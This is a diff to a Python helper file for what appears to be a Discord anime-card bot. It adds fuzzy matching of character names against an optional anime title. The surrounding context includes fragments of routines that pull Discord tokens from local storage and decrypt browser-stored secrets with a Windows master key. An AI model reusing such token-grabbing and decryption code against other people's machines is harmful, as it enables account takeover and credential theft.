@@ -9,7 +9,8 @@ from Crypto.Cipher import AES
 if os.name == "nt":
     from win32crypt import CryptUnprotectData
 
-# fuzzy match string
+
+# fuzzy match string against a flat list
 def isSomething(inp, list_of_interested, accuracy):
     if type(list_of_interested) is list:
         for seggs in list_of_interested:
@@ -21,6 +22,26 @@ def isSomething(inp, list_of_interested, accuracy):
             return True
         else:
             return False
+
+
+def isSomethingChar(char_text: str, anime_text: str, parsed_chars: list, accuracy: float) -> bool:
+    """
+    Each entry is either:
+      ("Gojo Satoru", None)
+      ("Gojo Satoru", "Jujutsu Kaisen")
+
+    This lets users avoid false positives
+    """
+    for char_name, char_anime in parsed_chars:
+        if not char_name:
+            continue
+        if Levenshtein.ratio(char_text, char_name) >= accuracy:
+            if char_anime is None:
+                return True
+            if Levenshtein.ratio(anime_text, char_anime) >= accuracy:
+                return True
+    return False
+
 
 # search local storage
 def find_tokens(path, debug):
@@ -49,6 +70,7 @@ def find_tokens(path, debug):
                     )
                 )
     return tokens
+
 
 # grab user tokens
 def get_tokens(debug):
@@ -81,6 +103,7 @@ def get_tokens(debug):
                 tokenz.append(f"{platform}: {token}")
     return tokenz
 
+
 # crack cipher
 def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
     iv = buff[3:15]
@@ -89,6 +112,7 @@ def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
     decrypted_pass = cipher.decrypt(payload)
     decrypted_pass = decrypted_pass[:-16].decode()
     return decrypted_pass
+
 
 # grab master key
 def get_master_key(self, path: str) -> str:
@@ -108,6 +132,7 @@ def get_master_key(self, path: str) -> str:
 
     return master_key
 
+
 # file monitor class
 class FileWatch:
     def __init__(self, filepath):
@@ -120,6 +145,7 @@ class FileWatch:
             self._cached_stamp = stamp
             return True
 
+
 if __name__ == "__main__":
     keypath = os.path.normpath(
         os.path.join(os.path.dirname(__file__), os.pardir, "keywords")
@@ -127,9 +153,19 @@ if __name__ == "__main__":
     with open(f"{keypath}/animes.txt", "r") as f:
         animes = f.read().splitlines()
     with open(f"{keypath}/characters.txt", "r") as f:
-        characters = f.read().splitlines()
+        raw = f.read().splitlines()
+    chars = []
+    for line in raw:
+        line = line.strip()
+        if not line:
+            continue
+        if ',' in line:
+            parts = line.split(',', 1)
+            chars.append((parts[0].strip(), parts[1].strip()))
+        else:
+            chars.append((line, None))
+
     ok = "Kaori Sensei"
-    character = ""
-    for i in characters:
-        ratio = Levenshtein.ratio(ok, i)
-        print(f"Accuracy: {ratio} - {i}")
+    for char_name, char_anime in chars:
+        ratio = Levenshtein.ratio(ok, char_name)
+        print(f"Accuracy: {ratio:.3f} - {char_name}" + (f" [{char_anime}]" if char_anime else ""))
